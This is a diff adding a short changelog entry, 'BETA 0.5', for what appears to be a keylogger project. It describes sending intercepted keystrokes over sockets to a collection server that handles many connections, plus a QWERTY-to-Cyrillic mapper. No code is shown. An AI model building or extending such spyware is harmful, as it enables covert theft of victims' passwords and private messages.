@@ -1,0 +1,8 @@
+---------------------------------------------------------------------------------------------------------------------
+BETA 0.5
+
+1. Added possibility to send .dll files with intercepted keys via sockets to server.
+2. Small server to receive files from keylogger implemented, fully standalone and can handle many connections.
+3. Added mapper program from Latin (QWERTY layout) to Cyrillic. 
+4. Perfomance improvements
+---------------------------------------------------------------------------------------------------------------------
